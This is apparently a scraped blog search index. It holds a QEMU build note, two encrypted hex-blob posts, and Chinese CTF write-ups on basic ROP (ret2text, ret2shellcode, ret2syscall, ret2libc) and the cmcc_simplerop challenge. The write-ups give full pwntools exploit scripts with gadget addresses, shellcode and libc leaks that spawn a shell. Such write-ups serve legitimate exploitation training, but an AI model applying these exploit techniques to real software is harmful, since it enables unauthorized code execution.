按照发布的补丁：https://git.qemu.org/?p=qemu.git;a=commit;h=75e5b70e6b5dcc4f2219992d7cffa462aa406af0 删除 qemu/util/memfd.c 中报错部分的 static 函数以及引用头文件重新编译即可 # 参考文章 http://www.fredyblog.cn/index.php/2021/06/28/arm-atf-optee/ https://icyshuai.blog.csdn.net/article/details/71499619","link":"/2022/04/10/OPTEE_ATF/"},{"title":"To kk","text":"a6d9ea9da8fc05ccc8d1164b3233fcb96eadc174fe335a7406937ef7072c444d697324cba0e37b9b8446977dff318bb0db8606b3edf6b8d0daa86a2631e54543dbf7440acc018a572a5805e41c0a5aec4e9024ae5c9494b297378fd0133293fec6f8fc387b255223def0e791912688c260471b0946570bb6f261b14a00b094e5ea0523ef7c4b049ef6652ec40e5e53703ba34bffad512cca69fdafbe61f6ae9db60bb0d77fe918acfc319a96214a6c221fa88c0012d7a9f8b6296dbce5c377d800c4c6d93e51fa2e15e8b28d45c26481b410a350aab4b45324f655bf0b638e15095bcbd036fb30406c7bb75c32da536a19cb5150d848fac97f4e24ab1bd165a207553b4f8983eda5e5e25ff6ef22e603b0f602fec1b54e9411d91a299b03eca1d90fe8fff28985965c90b34582265955e2ed38d2cb88f362e9b69ff2734f59ec530b56556232f4b7a26fe4b335d5096d654f8700dc273a74a0124a9eeb6bbfbf20774776ab88f3cdc03aeed95d4a3ede5e343b7aa206c3f08924191a6955f65ef3f7ac9ad32a038870855ca3c7acfa717698093fa35eb0a93a88dc795447ef7282b7560dec5419127d3e1f2230de8805c2b9b5847f6e2712ab1f4e303b5c754a284c972c9c6aad70015f05005cb157c773e8a25eb5877a630facd3857fb00400794702a6feae82fd2499981faf2e0b73d2a3c72989d93f03ddd0a1b85c3a02edb8d2595af4c2c55da9390784bb142ba341ff3fe4ff7041879a50324ce55098ce9be4590eb54348371ce0d216e6c360dcfe0915d03b7c30b96d2a220cad4e03e5d87e657d88111dbfd8c7431be8d704b05db3f97555afe5c34d8fd5cc31c3e171b74a9367ecf20f9653435d1e6d69389db1eae1b5d847d15f3cbb34df3b3ea893e1d8c03cc374ebbb90b2ff30dae7a08255785533da4cf8aa90a70ee4e22017919de0e7ea05e25b7e8e30aa33a72b4d42fa3121b4dd7a79e241e42c8aeac1cd098a75a75b0cbca649d39d03a38d4b67b5bbe9b993cb540f3bf5f4772b69c04a2792fff2f415aceb6bf269d5fabd6814d77894dd70eb8f8bd04e3098214d503ad9c75f54ab1458dde8c1b0e6aba744802b7d9d7ab9e86da0408dc0231f00b744e7c162e139bbca0d12ab6d3cec4cbe97e886477dfd5d9b1846bf8ff7795c30d6ea46d41a68eb05cf8e65feabb9e177becd2b81fade2e26eb88d9338228f76f7e45e8355e9e1bfd6929c4d66594681b0aae60f5a82527043dc5b8a6ecf2975c60528ea683ab8481a720f5d5ac5414cebd97d6d31177f398c4db556e045ffd961d9f6d31db8a71cc0c0fa31ec1f0b7ea5dc4bd7038c55e4287ab6655760e6b2200c6c73c4fe9508555e6b763479b7bcfb0386bdaf8ba20a347d90e1095aa443d20c12a68867eca1d94ca5a5422b317cfab797432fe3186ee76ecf953c638801585f3ae222da1f0232ab4171c8566695d74a4dcc575dfc96769ef870eea1b310844e7b80a626985b7cf503076bbf1eabf8807ed94163702f0327b5e232d4ab96c6d0664738e0b1e9c0a796d4e16c3a29ab3e2c322c10ba4f100fca47eea33e77dae5604ffbcb82c43737ca88a4f574ea9f0709d6d58d1be722243540f50219b7d9db9c38656a69a87a90ef1f68bc545a7f7f8ba7bbb265bb2daf77b65e53d7d9b9e90a273beecddbe2f2776d14871cd2adb8e0c8ee94d6694d29b60a7e529d9a0b2b26d597a42c965910ff06b620cea879251447d78314829c908bb75645f26e4b8a460f291afba15a4b9d6b6771d69c6d9180054844aaf077824e408b19cc66b8c0eaa55077da66d2ee7f5982ce88bfed0e677e20d3799973c7f9dea793f43bdce40bdb8ba96415c2fbf0c324185de0723dd14239b5636464ed93d4374d3840c2c67e1697495c0fff1cbacd5c8de085b08e8e9cc0f925f32b8d6242ae076aa602135e1a1798d7a6fd396b844f4b82b275c6ec9a23791db9e2acca00dce7e80105255b0a337c4ab25b50b101b2761a27cd15a40ad547730bfd23cdb526095c76e0d87a103b8d5256a0038cf48aa6b12b4a0c2afeb8fff007532511d7bb04e8ab721d45ff7e3deab6b4ec1990162d35babfd605b17a4b90f4f413e68bd0e72a184c36147bbb127c1a2932664a5a09cad7cbeee6d7d181813702b1665daa9de7662ad9a504a7ecea6333a53d152f18b8ededb4e6bfa8914d2c58cd69dad17bf3e88182c3cc9785ae706e68f2775e3b0f95bf4a56a1bd7ea02e06c2b22072faf82bd34ab0f08470737d7a5adbc6e5360799e165e378c0ff8921761e1e0101b88aa9ff2af0b623b465ea082ad9dcd134737005fceb63d352927d7b6f4f253b9ac3b41e82842464f4bda5751ac90494b2decd2f97c7df2c1e29b1f5d8668913a3d1b9b8775a04d5d3a81a2bf9b9ee5a758f06196759b1385d03831df3cc834d25001fc66f9a36cd9c89bbe4dd2954c42a69281182f71d574f3f29ba9b68f6905b63a0a1505315528582738b20c4627c056a59a4f74d8bb15785abbab589d9da4305d103f5dbb45cc7ece3f043b872490f9e0130a01d5015c090dd72c96971b422c4ba85443bd28449b8d5f3f526a2cb40b83d86f905296327b387e89635d7e1fd9ac75914520965d1d3f26b99d47a5913c054391a9652bb3d27db0666ec2ddd1be66e5274ae05ea37b315080ce921cf962b9d8419bde60dcabcf84608ff14db390a383ec8364dfcbff6b7da98797805f8540f4935d3e1d7e149cf3fc46f6b0d4f7ef7529570394343d527ae1591af2b704cf8d4368af95249f7c453df1e7a7a8aa1857a1aff0565870c3f74eed05026a9cd6d4e567ab0f547e23cb2fee7dcb3da11507f978 Pease input your password","link":"/2022/01/02/To%20kk/"},{"title":"CTF-WIKI-pwn-基本ROP 漏洞复现","text":"# 基本 ROP # ret2text 首先检查程序的保护机制。 关于各个保护机制的介绍 :https://www.cnblogs.com/Spider-spiders/p/8798628.html 看到只开启了 NX 保护，即不可在栈上执行代码。 使用 IDA 查看源码，可以看到这里有一个危险的 gets 函数 以及这里有一个 system 函数 所以如果能直接返回到 0x804863A，即可执行该函数。 在 GDB 中对 main 函数里的 gets 函数下断点。 可以看到，存储局部变量 s (eax) 位于 esp 中存储 查看 esp 和 ebp 得知 s 的地址为 0xffffcecc ebp 地址为 0xffffcf38 两者距离 108 个字节 所以 108+4=112 即为返回地址的地址。(因为没有开启 canary，ebp 上就是返回地址的值了。) python 脚本，我会给出注释 12345from pwn import * sh = process('./ret2text') #本地链接到文件target = 0x804863a #执行system('/bin/sh')函数的地址sh.sendline('A' * 112 + p32(target)) # 112是上面计算出来的s距离返回地址的字节距离sh.interactive() #进行交互 # ret2shellcode 先检查程序的保护机制 全部关闭，并且通过 RELRO 为 Partial 部分模式，得知程序存在存在可读可写可执行段。 通过 IDA 观察得知，这次同样使用不安全的 gets 输入，并且将输入完的值拷贝至 buf2，观察 buf2 是什么样的一块内存。 buf 是一块位于 bss 段的可读可写可执行段。所以泄露思路为: 将 shellcode 拷贝至 buf2 里，然后通过堆栈溢出将函数返回到执行 buf2 即可。 在 gets 函数处下断点 得知 s 地址为 0xffffcecc，ebp 地址为 0xffffcf38 ebp+4 即为函数返回地址。 所以 0xcf38-0xcecc+4 即为 s 与返回地址之间的字节距离。 写 python 脚本 12345678910from pwn import *context.binary = 'ret2shellcode' #全局自动设置架构类型与os类型sh=process('./ret2shellcode') #本地连接target=0x804A080#buf2的地址shellcode=asm(shellcraft.sh())#产生以一个最简单的执行system('/bin/sh')的shellcode 并进行汇编print(p32(target))payload=shellcode.ljust(0xcf38-0xcecc+4,'A')+p32(target)sh.sendline(payload)sh.interactive() # ret2syscall 先检查开启了哪些防护措施 开启了 NX 保护，所以无法在栈上直接执行代码。 使用 IDA 查看，仍然是 gets 函数导致的栈溢出。 使用系统调用来完成漏洞利用。 找到 pop eax,ret，以同样的方法找到 ebx.ecx.edx 以及 int 80h 系统调用和 bin/sh 接下来要了解 payload 这样构成的原因，需要知道这三个指令 在堆栈里，我们知道 ebp+4 的地方为返回地址。这是因为 leave 时 esp=ebp+4,ret 将当前 esp 指向的值作为返回地址跳转并且 ESP+4。 所以构造 payload 为 payload = flat ([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) 先用 112 个 A 填充，pop_eax_ret 为第一个返回地址，然后 ESP 指向 0xb, 以此类推。 写出 python 脚本，之前都解释过 不再注释了。 123456789101112131415from pwn import *sh = process('./rop')context.binary= 'rop'binsh = 0x80be409int_0x80 = 0x8049421pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() # ret2libc1 给出 got 表 PLT 表 以及 libc 的相关解释，我觉得写的很清楚 https://blog.csdn.net/Retrovich/article/details/82973086 基本流程仍然相似，先检查保护 只打开了 NX 检查是否存在 /bin/sh 在 IDA 中查找 system 函数 查看到 ptl 处的 system 函数 写 Python 脚本 12345678from pwn import *context.binary = 'ret2libc1'sh = process('./ret2libc1')binsh = 0x8049720system = 0x8048460payload = flat(['A'*112+system+'b'*4+binsh])&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;sh.sendline(payload)sh.interactive() # ret2libc2 这里仍然用相同的流程，唯一不同的是没有直接给出 /bin/sh, 需要先调用 gets 函数再利用 pop ret 调用 system 函数 直接给出 python 的脚本，与上一个例子相同，整体不再多赘述 1234567891011121314##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc2')gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat( ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive() 我给出了堆栈溢出的 ESP 指向流程图，顺着思考容易看懂 payload # ret2libc3 检查安全保护，只开启了 NX IDA 里查看，仍然是 gets 函数的堆栈溢出。 但是这里没有给 system 函数 也没有给定的 /bin/sh 所以需要我们从 libc 中调用 system 函数 根据这个知识点 写 exp, 涉及新的东西我仍然全部做注释 12345678910111213141516171819202122232425from pwn import *from LibcSearcher import LibcSearchercontext.binary='ret2libc3'sh = process('./ret2libc3')ret2libc3 = ELF('ret2libc3') #静态加载ELF文件puts_plt = ret2libc3.plt['puts'] #获取指定文件的plt条目libc_start_main_got = ret2libc3.got['__libc_start_main'] #获取指定文件的got条目main = ret2libc3.symbols['_start'] #获取指定文件的函数地址print(&quot;leak main_got addr and return main&quot;)payload = flat(['A'*112,puts_plt,main,libc_start_main_got]) #先使用plts_plt函数打印出main函数的在got表中的真实地址sh.sendlineafter('Can you find it !?',payload)libc_start_main_addr = u32(sh.recv()[0:4]) #获取main函数的真实地址libc = LibcSearcher('__libc_start_main',libc_start_main_addr) #获取libclibcbase = libc_start_main_addr-libc.dump('__libc_start_main') #获取libc基地址system_addr = libcbase+libc.dump('system') #获取system地址binsh_addr = libcbase +libc.dump('str_bin_sh') #获取binsh字符串地址print(&quot;now get shell&quot;)payload = flat(['A'*112,system_addr,'A'*4,binsh_addr]) #这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.sh.send(payload)sh.interactive()","link":"/2021/11/11/ROP/"},{"title":"cmcc_simplerop","text":"系统调用 + rop # cmcc_simplerop # 程序分析 32 位程序，开了 NX，部分 RELRO 保护 主函数存在栈溢出 该题 没有 system 函数和’/bin/sh’，考虑使用 int 80 系统调用，地址为 0x080493e1 设置系统调用 int80 (11,&quot;/bin/sh&quot;,null,null&quot;) 的参数 eax,ebx,ecx,edx 找到 eax，进行赋值，地址为 0x080bae06 找到 pop edx;pop,ecx;ret，地址为 0x0806e850 接下来调用 read 函数，将 /bin/sh 写入 bss 段，没有开 PIE，bss 地址为绝对地址。 # EXP 12345678910111213141516171819202122232425#coding=utf-8from pwn import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)# p = remote(&quot;node4.buuoj.cn&quot;, 29088)p = process('./simplerop')read_addr = 0x0806cd50int_80 = 0x080493e1pop_eax_ret = 0x080bae06pop_edx_ecx_eax_ret = 0x0806e850bss_addr = 0x080eb584payload = &quot;a&quot; * 0x20 + p32(read_addr) # 返回到read函数payload += p32(pop_edx_ecx_eax_ret) # 平衡栈空间payload += p32(0) + p32(bss_addr) + p32(8) # read函数的三个参数 payload += p32(pop_eax_ret) + p32(0xb) # 对eax进行赋值为11# 对edx、ecx、ebx进行赋值payload += p32(pop_edx_ecx_eax_ret) + p32(0) + p32(0) + p32(bss_addr)payload += p32(int_80)p.sendlineafter(&quot;:&quot;, payload)p.sendline(&quot;/bin/sh\\x00&quot;)p.interactive()","link":"/2022/01/24/cmcc_simplerop/"},{"title":"Diaries","text":"b6564b1d950e205446a5f2eabbefe8866c8c0c9144c3793e12be10a85944a02bc4de03a4c0bde1397987ad05a5904d00274cb29ed724545b94f9d252ea8414ebd4c44790d5faa95bda27c4ac90b3dbe7fbb3dc3e9882a5f3788bd09af293d89ce166e6838a4b09bdfd97f5b6e0c4002f908093c097f3d51787bdbcbb938f3be4e771d94ae9a8fec6a51592e1f71b753d4337ea00ae8cf9f9a437538cedccc4b90523d5c600e5f8e85d09826563eacea409070077698a537f91cf5e25c803f8d304b554b985ec3a8eb9cab7a78fc569af2427a5599a212432783d590ddad71c3f7cebb4b7a4c60ba19d947fcc75e7634e5506f9c2f27afaab094be16c44561eb4c3a8ab7ecebee25aa05ba16860089245095a5695821bfb6f0fe5e4ae38a9830115a6e7bc8750f4825607a40402666b8bf21f4f9b29818783f05a5cd6a594d4ce0f13a29380d14159b338b22603ee52b7f001ef02290c84de26412cb86d3630385523881be8bc75d8232079724d144186b3659b760055e3fa0d6de41fc1ce75610e204440f7de2cbdc6483ad80cbc5dfdfd2b1592d9f274d17922198d7a23cce2f515265f694f189808f55992542c25946fc8218411bb70be40036c8a817578ab4f80bd5f21b9a94820b7e1773dce4b325f9e077e96464d97ab9bb62ebc4fded6281cd7fc5feb0cfe0782b71b393c6888d253f8cf7a00617e523f7928f6c5a79718bc056c26f919546ac7a5c06a0734127a2e713eaa105fb636739670fd02947c98ad78302f48609611e08e0aa166d6c3e3454363107812b06c09af3819ed1689b2f33812fbefa318dcd88d0c88832e2b60452d633dda37662e2cca1d2d4279dcb7aea4153a2470981d2a20fb959bd36e21a138b88a83e95f1f39919fe5b021da3a5b5b063a2afd24d1dee68bd965ed808c68bc93f6b5ee38df7471321d9ba698e1708eb7bba78a4e05e32ab8c4e0946c226dfda777d0ad5181c4da3da208b5b9aa06f8ee9ca6218340d7894804ba03a7cc4499f749335a8098cb402b5dee833e85ff14f0d7448cce7563f570c7ccf7a415573575d36bc64b5156e97b4682019f1b3b58d9cc0b9505bc77722f22c6632111d0a215c4ed593de3766b36d08fe3c255c52cdb9f6447a0e8cf819c4f15ac2885547eee05ad29506717bb75c39ed1a4a45cb1ac62eb14a37690e07fc092313f4f68cb44172d9f4cd6ef09173ff12e51fece93b7befa8a0d8b17a6409af12701de2642f366c007c7984bca9951527243716530c5470fc5dde6c2c45621c1f585b718496a1b458668d57d3d960473acf363b96e2a4e0e37a78974b55f3b4fd7dc62857e0e304d1b4d40a4fe587022972cff7ab1ed797d2d5f2c70406aa09ea8b8d4fa5f5f4ccc2d1174ac0f08a9468d26fd476cab0c5c2b88879ad9057bae9e00d274898d59639242a113108a779355d9a7b19757927f25e042ad98b942023e300116d2728250a2dfd0c170075e1ae019ea2f7460fed77bf6d3f24c81a60269151ccfe598f53d2e782e6c03c34cf4bebab578780a7d5dd19345f0623449743683174fd83678e7fe68105c150365ffb9b7ed800cadc25b1913a637f324ac9eb44c45b5c63189d2bab7f04dc1d62cc82cfa309ea0c52121fc8d2eb1df229c45ae164d68cf4a31f8d75deb59bc1c8275bd286bc04c5204f2725b6a33ae24bad7e0eedd5888047c5ea13064c90bd8f034421825fce9a28d07af37af6e59409c6ba833a2598f9804d3a0de1ed7d5c40ad40600e7ccced00215280592ce5b9ee50eef04dac198c1c8c6db37e094edecf0175a28b461de4c7a748e8185408dfa238e02930faf9e213ccc59a3d4f9d6c0c3e90ff887c8cfa117394ccfedd272233e491d9d2c1183c82a65ae923c2acb42af36920e51395bd557972865d575136849d08660f59c10166910a2bffc63fe2497c013aa873aa2bd5dcdadd45f8fcb95cd233d34f4d85d61fd50e142a9aa076298ab37be471de9786cb089ac53f825843fecf95640c3cbd189cbddf2089ec3909cca18bd65ea7a9c1cfe926a9dbb03dd530eb8f602ccc7f3dfd49cceb743c4b692bb0a157ecc67920d60f17913c1395a8935ad6ea3237170d4fb1689126376a85bbc2681d99916a59a15e8c52dca5eb579cb5cb8da4581a3319d463c6cdbeeba92390a7e99634e84d7d54298683941c97c2559bf77055fed6ab67c61b6b9dc44eee905a4c577fcd4d2aae087dec024441ec0ed8dc89bedbb88d5c1bdafbf07e281c1f1ccfc60e884773c7e8b82d214b445bf0e01daa29112ec2af26833bad24ff94e796a00d9b218173bafe845198d02355cf0c9fbba1bff0dffd19abc6e214fb4d89e9fcdd7e72d1900a2fb8277ca3134577522385e199f8a08fe3c42525225a62ef8159fe5a5a3bc763d4a7eb347d1959988d21be181f1c9a722df439618288e36bfab320b1598c0c41d796e51faabd2cbf0f355c3ade511cd0c92f8bb4e81aa6d6e5ff11cbeb8461f4c044b06d259df94433052f4a2e1ca4a2b1d522985cf9c0a8abbd2ada2317ae976357661ae06c692cebf4305326be49dc3e81718e1ddc487a7c74420b8e0c77c92027e48bd7fc2aa94980733109029ffab6f8cd52d5eb037bba7fd172567701609ea176bf76eee46973c2d27835c5a93e9421bd21b5da7d566b70bef0fdb394b9f765e265727ea8fdf093a90f4eb66bc5f11e38b979424e85af1140b76178a0a91191dd74f5a79da9b45db67c0d7172b0a2bdc4729eba387e7fe03392623c91ce0c7731fabf79ec43795ca48683fe2200d74e1a694fc1a24f546d161641ff5188d54d96599c9e0597f54c5665d7f1ae203d5bf00e6ed6f63f7e288c831cf8639e7ff240ced5a94a7a57603706eac65b1cb00336ab34ff3e34260da25dee3359a90efa9fe158b0cd2e1aa9bafb7077e78293ec81b2bda620c95ba7897b4775e438f19648be41f446880b3d686d48d59734e534622c896554a3dbf0f9cf062f5c24d3556a91cce20fdd593af182e95b64ea2e11ea481f87364ff8597f355c84234507bb414493fd54b9d502ea2689258787ef0b04f15200ff0342fd9cf1805700e544d3fb3dd254416ccc8994ae177c16205e9e25b0d9d945558ba54906b415c291c2a50a245716d6a17a90123de110eae595c274f730a320fc026d6112337fd0bf460d6f9840333734bf6e7d319210f8d76a517f656e1cd28ba0d8bff011ed4dcf8301bc8ddf7d14d89edd74d064dd1a5feaed9244fbfe036808370698cce6f935093e3ccabb67f2238d30a6506321d6c00b77a31f64e9f702f06304aecbf0d02afeff20c2c427c3c62fb83f511f0a5e662639562ef90d7755fda30f49fe31c51e0ef29b4f5ca31329823037ec5c27a7e587cf594f97c370c8fc2f085315662e2befd48e8d259177d9877c11f8c5d7a2e653ab32199b00aa144c8574316bc0f496c7680f45d1e07c0bd2a6ced1ac03d3e8cb875491af60acf2d8087159990b6d034c4de846f7ed366a930fc0379ed84fd5621c6b648330c0c5c1ba9e1d8c922a2e8d95d987faf92bb53e0e0859740fea25c7c8aef6236978f442d14d16f118966ee4d3028272a4ece72747b7ad250f527a9078a2e282e2661471d2ed8dcdd0f3c8adf5bf09bbd371399b846cfb42017f1d87e87f25035d0970bc80451ead46111dfa89ca3930dcb998653dcec823ad80d7983b46f53a1a64be3c5a0e49ab1fe564b1937170890c54128bfe5c3dc98b22a7307c6d8ced9551b9aa4b867d658ed9f293e4f747287c28dd28adf53b6095c3b9b725660eca83a06bd17e2f1083bccf68c98d62a6e96a3b9008d6d1e7f2aeeb990f55700bb4e665e81c3018177ed2b3b206054ab5ee7097a014eea3442f99ee415ecf657b775b9cef7c928a5b5b89ad077fc452d0ec17ed90f07ced540e924f21867438a69e67b0018f317f9ca23a5b4f4359ff1a0beaf3e6865bfee9cbe74ce4cb6e82f2c868390b2a8a5c46e77a1d4ac8bff36c02ffddecb57d3538c0f01c6d5fa3d70c8fe51cd4c41642543f35e4c65cae900e89b8fa55c431e3b130f7265d25d1edace248fc87299290a69bffd56bea9d6d9d7c52a7a3aa14850d5ea6ce5e47171d9153305e6c11765cb5c4e5b92e7dae2766ae1c976f632cb5a0090f32012cd7146ed8212aeea8dd7d658b55d331d7b983cae9ce5fa5f77a226b1ad17249666da7f24cbeae7addf38ed8c488aa4d175cda5354b179c5354d96ae33fe2cde62f500302936abb458e1fceeb89c74bce9b908286bc4050ea4b20635ffdd911a2a7c1ae671cd79be65e530ebccd0f29a4c86a0aa752a0215cd159ea8aac4e52dbd428dd7b5d7f5c5dfbc2c6ce1a581647f88643365f5dad26f69fca59d3f55d0ec2e6619ff06e4a5167a9e32877b83ccd84f5e690770b684b366b13268828844d70cf490cfa4e1dd6ded66fde48cc5abb6ba57011369b55ce1c18b7e2725e9cec2fe766c569afa1d9cbc74d8d8c41863d8b63cf7410b269ac9725b23e946de3268ebc630d18f25e1dd8b3601274691c4a56a5d4c7016c7c23df5cc5ae6bc1e545b574d14b0a766cdddde6c2e8c5f3b1efc75374fd6dcd4a403074d887c9129d4a523feb742c944ad1cb5ca4f5481e409ca2a6da397503d1972858413cea084dcd29fcdbf22370e401f9e91de9ef4e2a733c1c91a2f673b04ff139e74163e717f7aad4e0e2600170900614cab5c908b35cda40eadcef4839baa9dbf61d04e37b6a0cf5367679f7dfcf9f7240bae2654a55ec608dc26f7d49fc277a2f3491b313bf4159b1b45746a91cf9f603e2208084db2da55e49aaa68c8288aa605da77d8e541f4a599f69e12a626e18fabbf18b23151a6bdb20058e8cff469df0aef372dc1192fce3d8dfa629fe69f89178511a400ba9847f242a8e9f6bfcdd5880ee1abd38be5f26d211365102afb3a5fdfc7efeea77123b4361debc38ccd7da3796f3293f7c9caca3d21a53e33ca5d85a64b159cf8d42a48e3d9845ab89b57d41c883f7d0333b15647b3429f75057a34dd9c04fd38092c028dbd028abbb31f1cf00d313bba589d37cace30277a317491b915e521a6cafb414b46f7fcf848ae2a57268f258ff7b7bbce21b60c117aa9191ab5ae0df5fc344c9e90784c0d86e75cef8fb949c9179a84b51fa6fb6fe6b7f25a0dc099dbd9ed6bc38c840f2a02ae38078a352d6965a7e1c5e6e56f864b91ae83171324280374991e1e0d0f62f632a57edd25dadb457744f02933213b2f9bd519b29523d7b32f0568c94cce3c7b13446e0053c5163634806efd316375d6e682bde4bf185ff30a1fed28dc6c172076dae1fe9a422d80a4fc46213d4cee7568898849a236e39dd32c4ae8b0b6357e5340a9ae19a4392f1a835361bf54df2d426f9397345885a3e704041fa02ed8ffca486e30150ad603e9cecebbc6d601318052eb4b750b9a0622748d327dd7414d97af1cf8f91ee960a9571fc7413062f6f063e503e0efd944b0d2f89374478dc2b8c560dab50395d4288b916bf70925d4d1e68582af81909a47e4641fd547dc185fdaa7b7d3b34067ef08df391f270cfa80e4a7285a7510929da450660aea099711bb64a883252e3905b696ece22c12987676cc8dda4bbf93b0b227955ea4c3149e83faf3d2a64133dafdc41483ffd8f6e0b4eddbd3a266e0625e844f477be7fa0aa38aa1150a58f5ef780550536338b27164cbb90a5f7b7493100e15f6d84710e6459411ed859306975174b7f73bc5ab8b74e87b3a8bf20273ffcd1127d07fd71b3e216ba062b20a000ae12fccdbe04ede2f0b45ee4a91eb3a7f403d818e1c61a2b90fd4fa295aac370ddb3c27fd0536c1418851cf549f4430793ba0a66f1f0fe6e8eaf2096c803b133fb40da9d2620782736d32e040d08bf7c8fbbb82083f8a39b74614590735dc194b79ca74e6a305b665175de8f33e6b601de96a948e6fa9c96247b9d557afd8f200e03077fcc16e14ed2bed30c13213cdf7f8c3b82aa783a9256b0a672e9755cfdd4532854d9bb7e0d83cb68693f13275f6e99ccb2fb801ae279568251e004c53c42d01ce850664dd083c60e735c5cbd904316b3c29e6872b65c5b11a3b81f399ef24d3cde3b4ca2a55a067bf162fd857e903b487673d2b02fce56b269f657bd9793dbee905ce5482c7b43775df776201e57d5f9aca2dbcf6483f79f50bade673b2be568a52e3d89c2ccfcbf91b3c9462a3fba19cf4a331a6dd7ccf68a4f1c216e724b506e910b0acf28b28beee95fb7836eeabf2daa261ee0fdcfc6158877c5b7689cbec95174c70590fc357be2abb704dcd128f80049afae70fe0770840a8d4fb6853b1fe378aae2ad01770d5b4d530c8ea97333623feceb614ee787cd11a47ab06defaada20840f615017b9d6d4ad8a8c80887ca1bf83796c29b807ccb8d4bd274196b4643be7e58ebe2150dbc6c5a861017cb6b1f93eb7e6d4e848a979636e96786a6285c7eb7d665e88615588d22a7bd6974a41e242740561747f2974b4971d8d3cf6cde97ad4eb02a0c1b7a362d637b8fdf5a6645c617f32df8d5144708beea32ae4c88a5a0384b61b613915f84cebc025e799288fa19d58ca42109e0578548a3cd97517eb3597fc80033ec483d0492e0de631a481b314050348e253c499cb1549ae94612682d3c0b091b9e980b092cc6f9b3a9e34cd9d8d17ba4ddfde86be8363cf9aeb8ee6a751981c35cd3a7c416a0ff8141d8061281ec186d99e8e6fd0cd77b4bbd2a4e923810beef301f1e0cb206a2e8399011ebc3e5563b0951ca4bed1825a333cd77e4ff4fa8e57c95bfcc836a0368cc7bfcfbd70d41a8c44487ab19d8a56c789e5d294a25ae6a606094a89faba970a80fc7b1f219c081ca85a1fa4521d3e15d0cd3c816ada5813bb4780ab0b5620026c01145b1c6f854fb68dbcfb332a2e2f6d02a7b6e8edf380863f6cba1d9aa274461bebccf41e25e0f6c6cb7de4242bd0b2473c08dffa5a9a73f42c32ded61d0048f102a12d8c5a0a87da95c4863d62d76c759316cf3bbf55306277526a9110e6b9884cdf5885c84f0461b69ba6ba7dd09a21ca7e14786785f0d4f30063f2c0d60869bf96a4c637fee3c95439ddf90794ce986068083bbbe5be9979d878f5dfb8e3a57e956b37928361dfd3eb6bfd80ace52810dc469f09eaf809030811fa267ded1758a8e1950cd2304b9dea0c0fa9d86fc9e99f50680e5663a36f8465304407dd40a2a4a0e624de65a64497d00037031a7b91827168bf1795cd0a83d8498adbda91d85086249944418df031f9547fa1cb7d49c68dee852e5b3be622a6e117791a720f12d8233cd45ace21f8874b11a24d1c39b58b4cd4c761c3e4efea7c28750dce9ef4f8f9b8b4c71d326d367f94559032d9ceb122cf49f9b4bd124ea5d7a45b51a1cea72c374b25ee861b0aa3cecd92696f648c6cf4ad786be265e99829c8f9ef7547e1f16ba654848365f326e997952a564642c39b8fba0cf8ca5b50ccd7c2ad11e3b80064c2c7d642681afb03d2f96007f8ff60a35832e184b061e36efd90079a96b0d69cbaff40ed9017ebf26c7156ad7cc01f8a459561a9efd6d012d2d399cb69a96ebc56cbe74cc5f06a74e282722b5bf0574dfac9d5f0264233d628356be2c103a89cd165ddbf47c0acf744e922f564713e3ccd450c50d235445e75e295c52c27f286a11ffdf8f39a4aab2c0d953fe57f810d25c91fa8a8af42d2453a4a48eada1cf1acf4c6844c629de04eaea119fdf978012ae453f1c26d3cd1f78ca1e674fd35898d3c529eab101cb0e196a9c86ade8b5cd0e613728fd12b5b9fd11acae9403eb41d7501de0e2589c1e7f3d2fffd59206ac4e537ceeae19ceaaf6829db4581dc0b14417579908fa2aa932217dffcbb3c77456eb3c5a37253c6297649927a87353da9221b99f7f69f2434904a4fc8bd701be1984708eec6c045cd76a6b08dc629d23469c2fbf04e99d91088fda1a6ac6b5c8f57ebd3fc13d93f74529aa438e212a4bed67cc6205e8f860e0e0375940bb05fa25b5a410f26ea56d1cc0751f2d5315b5fbaa4549084c504d1d600c4be97701fe243f222bb9ecc8a5260fdb1e09c7cbc2b70e18bcc204f43321427316fb62653743333aed955d38de6633a45aef806504bd5b503af7f07306ceec3255f7f4bf21fda2d03cfc65a0b549a3c75fb44d443df501e516d7bea6dcc8f1834408b6e22853bb8bbcf3079a12a0ba257cbf408bb8483082b4028aba57908dfd52a5b25aec8d4a96e14b73a9c4936a0603e465cf409298b147a4b67dc082bbad7f9f9b5234902ac8bb97e514d54f09c5575a32da647c2288ef998c33e408d54764e963ecc2c55d52c28e92b1f2cfdbfb0a1ba3f4efa230dcf928ad261418a80e21b0011868b1a26caedf4256ef5ac3fb091957835e5ef271d2376630b232e5e4bdc600468f55fe04a9f4d80255d752362a0b9df9c5f2efac5946964231c8bd4b1dbc921cbeacc54afe429ca549a3fef78cb2825006f089f2b45103747477fd3598b536202b06df536847cc385f3dc36f0d16ca5c32364b379a3e10c2402ce0e75d06ffcb900bd1e8673345e836aaf833e9ba649a0fc78c0a644701b4b6c849c296007e4bdaec6a3adb9f1fcbbfaa4e025e0a0a9ba0af37cf39ba397fa8cb3a4626cb62d35be0b22b25a572654d93cac8890421e07f8c6eabe4f267e56c2cbd10c8d3b14723e79d76a9038a73d4d51f81473cc1bc3c99df369b4b866b846b2b635be9452511e10cedd351279878382d9befb59cf471d5b5514bf8ed9c42bd4f7035875bcf2fe394d9d5b637a398959abc7366c40365c04a3bec4162ab8dd3beb554cd54497ed380f94a9f07b933687a3c20d4557a3b569ffebfde15265ff61c7512edf9a4ff919e1e0f260d46aef26011e144ce873ba7f0f7dda9f5a0895576a20474948b3ca31fa732b3f9279647481b0602297b813491e11d15ac0906eacd2ff339a59e3c8efacaa7df2c1a138725252010197c82b3aa205a6934755c14a625045c74d9de52072a1569d5feb808db3db481e9ea0d994ac6268abc0c6a949092584cb54c24d8ac3d0c866a6c4a57